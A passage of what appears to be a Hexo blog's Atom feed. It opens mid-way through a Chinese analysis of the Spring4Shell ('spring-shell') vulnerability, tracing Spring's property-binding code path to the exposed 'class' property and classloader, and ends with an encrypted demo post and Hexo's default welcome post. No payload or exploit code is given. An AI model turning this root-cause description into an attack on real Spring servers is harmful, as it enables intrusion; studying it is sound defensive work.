又由于jdk9+版本的特性在module里可以调用classloader,导致可以反射执行任意类的无参get方法</strong></p><p><strong>参数绑定的具体实现调用栈为</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">applyPropertyValues——&gt;setPropertyValues——&gt;setPropertyValue</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223147913.png" alt="image-20220405223147913"></strong></p><p><strong>再 <code>setPropertyValues</code> 里调用函数 <code>setPropertyValue</code></strong> </p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223311152.png" alt="image-20220405223311152"></strong></p><p><strong><code>propertyName</code>会取pv的name值</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223908400.png" alt="image-20220405223908400"></strong></p><p><strong>这里会通过<code>getPropertyAccessorForPropertyPath</code>-&gt;<code>getFirstNestedPropertySeparatorIndex</code>-&gt;<code>getNestedPropertySeparatorIndex</code>里的方法进行字符产分割判断 循环propertyPath 里的字符串，若存在则按“.”分割赋值给nestedProperty，pos为nestedProperty值的长度</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405225025804.png" alt="image-20220405225025804"></strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405224155780.png" alt="image-20220405224155780"></strong></p><p><strong>后面进入到 getNestedPropertyAccessor -&gt;getPropertyValue-&gt;getLocalPropertyHandler方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractNestablePropertyAccessor.<span class="type">PropertyTokenHolder</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="built_in">this</span>.getPropertyNameTokens(nestedProperty);</span><br></pre></td></tr></table></figure><p><strong>主要是获取tokens</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405225848328.png" alt="image-20220405225848328"></strong></p><p><strong>getCachedIntrospectionResults方法里会加载Bean class  并且返回给this.cachedIntrospectionResults</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405230612688.png" alt="image-20220405230612688"></strong></p><p><strong>在getPropertyDescriptor 方法里参数propertyName（即nestedProperty属性）是否在User的属性列表里，查看一下这个property列表，除了自动获取的User类的public方法和属性外，竟然还自带了一个class属性：</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405230940100.png" alt="image-20220405230940100"></strong></p><p><strong>最终通过readMethod.invoke 去进行反射执行set方法</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405234559412.png" alt="image-20220405234559412"></strong></p><p><strong>其实这个洞 我根本看不懂，云里雾里</strong> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;spring-shell-简析&quot;&gt;&lt;a href=&quot;#spring-shell-简析&quot; class=&quot;headerlink&quot; title=&quot;spring-shell 简析&quot;&gt;&lt;/a&gt;spring-shell 简析&lt;/h2&gt;&lt;h2 id=&quot;漏洞检测&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="spring" scheme="http://example.com/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>demo</title>
    <link href="http://example.com/2022/04/02/demo/demo/"/>
    <id>http://example.com/2022/04/02/demo/demo/</id>
    <published>2022-04-02T14:54:51.697Z</published>
    <updated>2022-04-02T14:59:03.469Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4fc00ec4f16e6aaf81b58ac3a63b42b279d4328204842d5086e3e63d7d9170e5">4630436162ade97ba2718b7d0c4b3b631ce3008cbd2d9c6a68213d361e81f8e1e14b9538fc1cae8a5bbf248499ea8b60f37acb621aad679d6a67aa4e4625d24de00ce6e7fc24db5760dd895eca8bef5094f68580d26b5b9e1a0f655f653bb586ad544920f56111e6bf8644f81c0fcc2af6d88a3c32b86d5e50729d04c335493ca52b5ab856be559cb2fef29381090e7dffbd7f515d50b59a1d5952d84e9d11ce5264cff938ff19a04fc817b4a15299a19334bfc8ec68bca2db4d33e88e5e074c3a95e29beecf9371cae8aa234605adb824d568db2c0efb5f77de93cb41e5785466c55094bcd359c8ba1770309e5fd20a4d3b8f032856c910051234f68b407771</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="demo" scheme="http://example.com/tags/demo/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/04/02/hello-world/"/>
    <id>http://example.com/2022/04/02/hello-world/</id>
    <published>2022-04-02T08:18:21.548Z</published>
    <updated>2022-04-02T08:18:21.548Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
